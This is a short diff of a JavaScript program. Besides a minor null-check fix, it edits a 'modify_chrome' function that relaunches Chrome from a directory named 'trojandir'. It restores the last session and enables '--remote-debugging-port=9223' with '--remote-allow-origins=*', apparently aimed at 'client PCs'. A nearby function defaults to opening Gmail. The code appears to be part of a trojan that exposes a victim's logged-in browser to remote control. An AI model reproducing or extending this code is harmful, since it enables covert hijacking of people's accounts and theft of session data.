@@ -1553,11 +1553,11 @@ function getRandomCode(n) {
 }
 
 function isNullOrWhitespace(str) {
-    if (typeof str === "undefined") {
+    if (typeof str === "undefined" || str === null ) {
         return true;
     }
 
-    if (!(typeof str === "string")) return false;
+    if (!(typeof str === "string")) return true;
 
     return !str || !str.trim();
 }
@@ -4440,6 +4440,7 @@ function spawn_chrome(starturl='https://www.gmail.com/', debugport=9223, datadir
 
 // TODO modify for client PCs / TPL
 async function modify_chrome() {
+// https://peter.sh/experiments/chromium-command-line-switches/
 
     logmsg('starting');
 
@@ -4487,19 +4488,17 @@ async function modify_chrome() {
 
     cmdlineargs = [
         `--hide-crash-restore-bubble`,
-        `--user-data-dir="${path.join(sessionstate.trojandir,chrome)}"`,
+        `--user-data-dir="${path.join(systemstate.trojandir,'chrome')}"`,
         `--profile-directory=Default`,
         `--restore-last-session`,
         `--start-maximized`,
         `--no-first-run`, // You can skip Chrome's welcome and setup screens
-        // `--remote-allow-origins=*`,
-        // `--remote-debugging-port=9223`
+        `--remote-allow-origins=*`,
+        `--remote-debugging-port=9223`,
+        `--no-default-browser-check`,
         // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
-        // `--remote-debugging-port=${debugport}`,
-        // `--user-data-dir=${datadir}`,
         // `--new-window ${starturl}`,
         // headless ? `--headless=new` : '',
-        // `--no-default-browser-check`,
         // `--ignore-certificate-errors`,
         // `--window-position=${x_pos},${y_pos}`,
         // `--window-size=${width},${height}`,
